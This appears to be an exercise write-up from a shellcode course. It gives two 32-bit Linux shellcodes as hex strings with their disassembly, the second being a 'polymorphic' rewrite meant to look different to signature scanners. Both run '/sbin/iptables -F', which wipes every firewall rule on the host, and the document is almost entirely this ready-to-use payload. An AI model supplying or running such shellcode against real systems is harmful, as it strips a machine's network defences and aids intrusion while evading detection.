## Initial nasm code

Length: 43 bytes

Obtain from running: 

    echo -ne "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" | ndisasm -u -
  
    00000000  31C0              xor eax,eax
    00000002  50                push eax
    00000003  66682D46          push word 0x462d
    00000007  89E6              mov esi,esp
    00000009  50                push eax
    0000000A  68626C6573        push dword 0x73656c62
    0000000F  6869707461        push dword 0x61747069
    00000014  6862696E2F        push dword 0x2f6e6962
    00000019  682F2F2F73        push dword 0x732f2f2f
    0000001E  89E3              mov ebx,esp
    00000020  50                push eax
    00000021  56                push esi
    00000022  53                push ebx
    00000023  89E1              mov ecx,esp
    00000025  89C2              mov edx,eax
    00000027  B00B              mov al,0xb
    00000029  CD80              int 0x80
    
  
 ## Polymorphic shellcode

Length: 45 bytes

Obtain from running: 

    echo -ne "\x51\x66\x68\x2d\x46\x8d\x75\xde\x51\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x8d\x5e\xec\x51\x56\x53\x8d\x4b\xf4\x31\xd2\x6a\x0b\x58\xcd\x80" | ndisasm -u -

    00000000  51                push ecx
    00000001  66682D46          push word 0x462d
    00000005  8D75DE            lea esi,[ebp-0x22]
    00000008  51                push ecx
    00000009  68626C6573        push dword 0x73656c62
    0000000E  6869707461        push dword 0x61747069
    00000013  6862696E2F        push dword 0x2f6e6962
    00000018  682F2F2F73        push dword 0x732f2f2f
    0000001D  8D5EEC            lea ebx,[esi-0x14]
    00000020  51                push ecx
    00000021  56                push esi
    00000022  53                push ebx
    00000023  8D4BF4            lea ecx,[ebx-0xc]
    00000026  31D2              xor edx,edx
    00000028  6A0B              push byte +0xb
    0000002A  58                pop eax
    0000002B  CD80              int 0x80
